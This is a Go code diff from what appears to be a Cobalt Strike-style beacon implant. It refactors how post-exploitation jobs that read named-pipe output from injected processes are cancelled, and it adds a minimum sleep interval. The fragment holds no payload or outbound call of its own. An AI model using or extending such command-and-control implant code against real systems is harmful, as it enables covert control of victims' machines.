@@ -4,6 +4,7 @@ package command
 
 import (
 	"bytes"
+	"context"
 	"errors"
 	"golang.org/x/sys/windows"
 	"main/config"
@@ -43,7 +44,8 @@ type job struct {
 	callback    int
 	pipeName    string
 	sleepTime   uint16
-	stopCh      chan bool
+	ctx         context.Context
+	cancelFunc  context.CancelFunc
 }
 
 var jobs []job
@@ -354,6 +356,9 @@ func HandlerJobAsync(b []byte) error {
 	_ = packet.ReadInt(buf)
 	callbackType := packet.ReadShort(buf)
 	sleepTime := packet.ReadShort(buf)
+	if sleepTime < 1000 {
+		sleepTime = 1000
+	}
 	pipeName, _ := parseAnArg(buf)
 	// when in 4.1+, pipeName will always be 57 bytes length padding with 0, I need to remove it manually
 	pipeName = bytes.TrimRight(pipeName, "\x00")
@@ -361,14 +366,15 @@ func HandlerJobAsync(b []byte) error {
 	if currentPid == 0 {
 		return nil
 	}
-	stopCh := make(chan bool, 1)
+	ctx, cancel := context.WithCancel(defaultCtx)
 	j := job{
 		jid:         jobCnt,
 		pid:         currentPid,
 		handle:      currentHandle,
 		description: string(description),
 		pipeName:    string(pipeName),
-		stopCh:      stopCh,
+		ctx:         ctx,
+		cancelFunc:  cancel,
 		sleepTime:   sleepTime,
 		callback:    int(callbackType),
 	}
@@ -401,7 +407,7 @@ func KillJob(b []byte) error {
 	for _, j := range jobs {
 		if j.jid == int(jid) {
 			// don't kill the process, just disconnect the pipe
-			j.stopCh <- true
+			j.cancelFunc()
 		}
 	}
 	return nil
@@ -444,7 +450,7 @@ func readNamedPipe(j job) error {
 			return err
 		}
 	}
-	return loopRead(j.handle, pipe, int(j.sleepTime), j.callback, j.stopCh)
+	return loopRead(j.handle, pipe, int(j.sleepTime), j.callback, j.ctx)
 	//pipe, err := winio.DialPipe(j.pipeName, nil)
 	//if err != nil {
 	//	// try it twice in case of sleep time is too short
